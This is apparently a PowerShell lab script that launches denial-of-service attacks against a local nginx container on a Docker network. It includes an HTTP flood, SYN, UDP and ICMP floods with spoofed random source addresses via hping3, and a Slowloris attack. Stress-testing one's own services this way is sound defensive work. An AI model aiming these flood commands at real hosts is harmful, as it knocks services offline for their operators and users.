$option = $args[0]
$network = "prjctr03"

if ($option -eq "httpflood") {
    docker run --name siege --rm --network $network -t yokogawa/siege -b -t 60s -c 5 http://nginx/api/products?query=pho
    return
}

if ($option -eq "tcpsynflood") {
    docker run --name tcpsynflood --rm --network $network utkudarilmaz/hping3:latest --rand-source -S -q -n --flood nginx -p 80
    return
}

if ($option -eq "udpflood") {
    docker run --name udpflood --rm --network $network utkudarilmaz/hping3:latest --rand-source --udp --flood nginx -p 80
    return
}

if ($option -eq "icmpflood") {
    docker run --name icmpflood --rm --network $network utkudarilmaz/hping3:latest --rand-source -1 --flood nginx -p 80
    return
}

if ($option -eq "slowloris") {
    docker build .\ddos\Slowloris -t slowloris:0.0.1
    docker run --name slowloris --rm --network $network slowloris:0.0.1 dotnet Slowloris.dll -i nginx -p 80 -s 1
    return
}

throw "Unknown option selected $option"